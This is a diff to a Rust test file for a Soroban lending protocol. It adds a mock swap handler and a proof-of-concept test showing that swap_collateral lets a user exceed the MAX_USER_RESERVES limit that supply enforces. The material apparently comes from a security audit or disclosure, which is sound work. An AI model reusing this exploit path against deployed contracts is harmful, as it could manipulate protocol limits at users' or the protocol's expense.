@@ -517,3 +517,117 @@ fn test_submission_validity() {
     //     let post = setup.router.get_user_account_data(&setup.user);
     //     assert!(post.health_factor < k2_shared::WAD, "bug: HF below 1.0");
 }
+
+// ============================================================================
+// MockSwapHandler — 1:1 swap for PoC testing
+// ============================================================================
+
+#[contract]
+pub struct MockSwapHandler;
+
+#[contractimpl]
+impl MockSwapHandler {
+    pub fn execute_swap(
+        env: Env,
+        _from_token: Address,
+        to_token: Address,
+        amount_in: u128,
+        _min_out: u128,
+        recipient: Address,
+    ) -> u128 {
+        token::Client::new(&env, &to_token).transfer(
+            &env.current_contract_address(),
+            &recipient,
+            &(amount_in as i128),
+        );
+        amount_in
+    }
+}
+
+// ============================================================================
+// PoC: HIGH — swap_collateral bypasses MAX_USER_RESERVES
+// ============================================================================
+
+#[test]
+fn test_poc_swap_collateral_bypasses_max_user_reserves() {
+    let env = Env::default();
+    env.mock_all_auths();
+    let setup = Setup::new(&env);
+
+    let supply_amount: u128 = 1_000_000_000;
+
+    // slot 0: asset_a
+    setup.router.supply(&setup.user, &setup.asset_a, &supply_amount, &setup.user, &0u32);
+    // slot 1: asset_b
+    setup.router.supply(&setup.user, &setup.asset_b, &supply_amount, &setup.user, &0u32);
+
+    // slots 2-14: register and supply to 13 more reserves
+    for _ in 0..13u32 {
+        let (asset, _a, _d) = Setup::register_reserve(
+            &env, &setup.admin, &setup.pool_configurator,
+            &setup.router, &setup.router_addr,
+            &setup.oracle, &setup.interest_rate_strategy,
+            8000, 8500,
+        );
+        token::StellarAssetClient::new(&env, &asset)
+            .mint(&setup.user, &(supply_amount as i128));
+        token::Client::new(&env, &asset).approve(
+            &setup.user, &setup.router_addr,
+            &(supply_amount as i128), &(env.ledger().sequence() + 10_000),
+        );
+        setup.router.supply(&setup.user, &asset, &supply_amount, &setup.user, &0u32);
+    }
+
+    // verify at limit
+    let cfg = setup.router.get_user_configuration(&setup.user);
+    assert_eq!(k2_shared::UserConfiguration { data: cfg.data }.count_active_reserves(), 15, "should be at MAX_USER_RESERVES");
+
+    // register 16th reserve
+    let (asset_16, _a16, _d16) = Setup::register_reserve(
+        &env, &setup.admin, &setup.pool_configurator,
+        &setup.router, &setup.router_addr,
+        &setup.oracle, &setup.interest_rate_strategy,
+        8000, 8500,
+    );
+    token::StellarAssetClient::new(&env, &asset_16)
+        .mint(&setup.user, &(supply_amount as i128));
+    token::Client::new(&env, &asset_16).approve(
+        &setup.user, &setup.router_addr,
+        &(supply_amount as i128), &(env.ledger().sequence() + 10_000),
+    );
+
+    // PART 1: supply to 16th fails
+    let supply_result = setup.router.try_supply(
+        &setup.user, &asset_16, &supply_amount, &setup.user, &0u32,
+    );
+    assert!(supply_result.is_err(), "supply to 16th must fail");
+
+    // PART 2: swap_collateral to 16th bypasses the limit
+    let handler_addr = env.register(MockSwapHandler, ());
+    let mut wl = soroban_sdk::Vec::new(&env);
+    wl.push_back(handler_addr.clone());
+    setup.router.set_swap_handler_whitelist(&wl);
+
+    let swap_amount: u128 = supply_amount / 10;
+    token::StellarAssetClient::new(&env, &asset_16)
+        .mint(&handler_addr, &(swap_amount as i128));
+
+    setup.router.swap_collateral(
+        &setup.user,
+        &setup.asset_a,
+        &asset_16,
+        &swap_amount,
+        &1u128,
+        &Some(handler_addr),
+    );
+
+    let cfg_after = setup.router.get_user_configuration(&setup.user);
+    assert_eq!(
+        k2_shared::UserConfiguration { data: cfg_after.data }.count_active_reserves(), 16,
+        "VULNERABILITY: swap_collateral bypassed MAX_USER_RESERVES"
+    );
+
+    println!("supply to 16th:          BLOCKED (correct)");
+    println!("swap_collateral to 16th: BYPASSED (vulnerability!)");
+    println!("active reserves: {}/64", k2_shared::UserConfiguration { data: cfg_after.data }.count_active_reserves());
+}
